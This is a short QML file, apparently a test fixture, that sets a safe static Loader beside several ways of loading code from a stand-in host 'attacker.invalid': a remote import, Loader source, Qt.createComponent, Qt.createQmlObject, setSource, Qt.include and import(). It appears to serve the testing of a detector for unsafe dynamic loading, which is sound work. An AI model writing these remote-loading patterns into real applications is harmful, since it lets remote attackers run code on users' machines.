import QtQuick
import "https://attacker.invalid/module"

Item {
    property string dynamicUrl: "https://attacker.invalid/payload.qml"
    property Component safeStaticComponent: Component { Item {} }

    Loader { sourceComponent: safeStaticComponent }
    Loader { source: dynamicUrl }

    function construct(payload, loader) {
        Qt.createComponent(dynamicUrl)
        Qt.createQmlObject(payload, loader)
        loader.setSource(dynamicUrl)
        Qt.include(dynamicUrl)
        import(dynamicUrl)
    }
}
